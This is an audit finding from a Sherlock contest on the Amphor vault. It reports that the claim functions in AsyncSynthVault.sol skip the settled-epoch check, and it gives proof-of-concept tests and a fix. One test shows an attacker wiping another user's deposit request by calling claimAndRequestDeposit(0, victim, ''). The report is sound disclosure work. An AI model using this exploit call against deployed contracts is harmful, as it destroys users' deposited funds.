# fugazzi - Claim functions don\u0027t validate if the epoch is settled

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Amphor
**Keywords:** cybersecurity, vulnerability, epoch, claim functions, settled epoch, loss of funds, claimAndRequestDeposit, deposit, redemption, assets, shares, uninitialized values, zero results, attacker, wiping requests, proof of concept, critical impact, manual review, security recommendation, request validation

---

fugazzi

high

# Claim functions don\u0027t validate if the epoch is settled

## Summary

Both claim functions fail to validate if the epoch for the request has been already settled, leading to loss of funds when claiming requests for the current epoch. The issue is worsened as \u0060claimAndRequestDeposit()\u0060 can be used to claim a deposit on behalf of any account, allowing an attacker to wipe other\u0027s requests.

## Vulnerability Detail

When the vault is closed, users can request a deposit, transfer assets and later claim shares, or request a redemption, transfer shares and later redeem assets. Both of these processes store the assets or shares, and later convert these when the epoch is settled. For deposits, the core of the implementation is given by \u0060_claimDeposit()\u0060:

\u0060\u0060\u0060solidity
function _claimDeposit(
    address owner,
    address receiver
)
    internal
    returns (uint256 shares)
{
    shares = previewClaimDeposit(owner);

    uint256 lastRequestId = lastDepositRequestId[owner];
    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
    epochs[lastRequestId].depositRequestBalance[owner] = 0;
    _update(address(claimableSilo), receiver, shares);
    emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);
}

function previewClaimDeposit(address owner) public view returns (uint256) {
    uint256 lastRequestId = lastDepositRequestId[owner];
    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
    return _convertToShares(assets, lastRequestId, Math.Rounding.Floor);
}

function _convertToShares(
    uint256 assets,
    uint256 requestId,
    Math.Rounding rounding
)
    internal
    view
    returns (uint256)
{
    if (isCurrentEpoch(requestId)) {
        return 0;
    }
    uint256 totalAssets =
        epochs[requestId].totalAssetsSnapshotForDeposit + 1;
    uint256 totalSupply =
        epochs[requestId].totalSupplySnapshotForDeposit + 1;

    return assets.mulDiv(totalSupply, totalAssets, rounding);
}
\u0060\u0060\u0060

And for redemptions in \u0060_claimRedeem()\u0060:

\u0060\u0060\u0060solidity
function _claimRedeem(
    address owner,
    address receiver
)
    internal
    whenNotPaused
    returns (uint256 assets)
{
    assets = previewClaimRedeem(owner);
    uint256 lastRequestId = lastRedeemRequestId[owner];
    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
    epochs[lastRequestId].redeemRequestBalance[owner] = 0;
    _asset.safeTransferFrom(address(claimableSilo), address(this), assets);
    _asset.transfer(receiver, assets);
    emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);
}

function previewClaimRedeem(address owner) public view returns (uint256) {
    uint256 lastRequestId = lastRedeemRequestId[owner];
    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
    return _convertToAssets(shares, lastRequestId, Math.Rounding.Floor);
}

function _convertToAssets(
    uint256 shares,
    uint256 requestId,
    Math.Rounding rounding
)
    internal
    view
    returns (uint256)
{
    if (isCurrentEpoch(requestId)) {
        return 0;
    }
    uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForRedeem + 1;
    uint256 totalSupply = epochs[requestId].totalSupplySnapshotForRedeem + 1;

    return shares.mulDiv(totalAssets, totalSupply, rounding);
}
\u0060\u0060\u0060

Note that in both cases the "preview" functions are used to convert and calculate the amounts owed to the user: \u0060_convertToShares()\u0060 and \u0060_convertToAssets()\u0060 use the settled values stored in \u0060epochs[requestId]\u0060 to convert between assets and shares.

However, there is no validation to check if the claiming is done for the current unsettled epoch. If a user claims a deposit or redemption during the same epoch it has been requested, the values stored in \u0060epochs[epochId]\u0060 will be uninitialized, which means that \u0060_convertToShares()\u0060 and \u0060_convertToAssets()\u0060 will use zero values leading to zero results too. The claiming process will succeed, but since the converted amounts are zero, the users will always get zero assets or shares.

This is even worsened by the fact that \u0060claimAndRequestDeposit()\u0060 can be used to claim a deposit on behalf of any account. An attacker can wipe any requested deposit from an arbitrary \u0060account\u0060 by simply calling \u0060claimAndRequestDeposit(0, account, "")\u0060. This will internally execute \u0060_claimDeposit(account, account)\u0060, which will trigger the described issue.

## Proof of concept

The following proof of concept demonstrates the scenario in which a user claims their own deposit during the current epoch:

\u0060\u0060\u0060solidity
function test_ClaimSameEpochLossOfFunds_Scenario_A() public {
    asset.mint(alice, 1_000e18);

    vm.prank(alice);
    vault.deposit(500e18, alice);

    // vault is closed
    vm.prank(owner);
    vault.close();

    // alice requests a deposit
    vm.prank(alice);
    vault.requestDeposit(500e18, alice, alice, "");

    // the request is successfully created
    assertEq(vault.pendingDepositRequest(alice), 500e18);

    // now alice claims the deposit while vault is still open
    vm.prank(alice);
    vault.claimDeposit(alice);

    // request is gone
    assertEq(vault.pendingDepositRequest(alice), 0);
}
\u0060\u0060\u0060

This other proof of concept illustrates the scenario in which an attacker calls \u0060claimAndRequestDeposit()\u0060 to wipe the deposit of another account.

\u0060\u0060\u0060solidity
function test_ClaimSameEpochLossOfFunds_Scenario_B() public {
    asset.mint(alice, 1_000e18);

    vm.prank(alice);
    vault.deposit(500e18, alice);

    // vault is closed
    vm.prank(owner);
    vault.close();

    // alice requests a deposit
    vm.prank(alice);
    vault.requestDeposit(500e18, alice, alice, "");

    // the request is successfully created
    assertEq(vault.pendingDepositRequest(alice), 500e18);

    // bob can issue a claim for alice through claimAndRequestDeposit()
    vm.prank(bob);
    vault.claimAndRequestDeposit(0, alice, "");

    // request is gone
    assertEq(vault.pendingDepositRequest(alice), 0);
}
\u0060\u0060\u0060

## Impact

CRITICAL. Requests can be wiped by executing the claim in an unsettled epoch, leading to loss of funds. The issue can also be triggered for any arbitrary account by using \u0060claimAndRequestDeposit()\u0060.

## Code Snippet

https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L742-L756

https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L758-L773

## Tool used

Manual Review

## Recommendation

Check that the epoch associated with the request is not the current epoch.

\u0060\u0060\u0060diff
    function _claimDeposit(
        address owner,
        address receiver
    )
        internal
        returns (uint256 shares)
    {
+       uint256 lastRequestId = lastDepositRequestId[owner];
+       if (isCurrentEpoch(lastRequestId)) revert();
      
        shares = previewClaimDeposit(owner);

-       uint256 lastRequestId = lastDepositRequestId[owner];
        uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];
        epochs[lastRequestId].depositRequestBalance[owner] = 0;
        _update(address(claimableSilo), receiver, shares);
        emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);
    }
\u0060\u0060\u0060

\u0060\u0060\u0060diff
    function _claimRedeem(
        address owner,
        address receiver
    )
        internal
        whenNotPaused
        returns (uint256 assets)
    {
+       uint256 lastRequestId = lastRedeemRequestId[owner];
+       if (isCurrentEpoch(lastRequestId)) revert();
        
        assets = previewClaimRedeem(owner);
-       uint256 lastRequestId = lastRedeemRequestId[owner];
        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];
        epochs[lastRequestId].redeemRequestBalance[owner] = 0;
        _asset.safeTransferFrom(address(claimableSilo), address(this), assets);
        _asset.transfer(receiver, assets);
        emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);
    }
\u0060\u0060\u0060

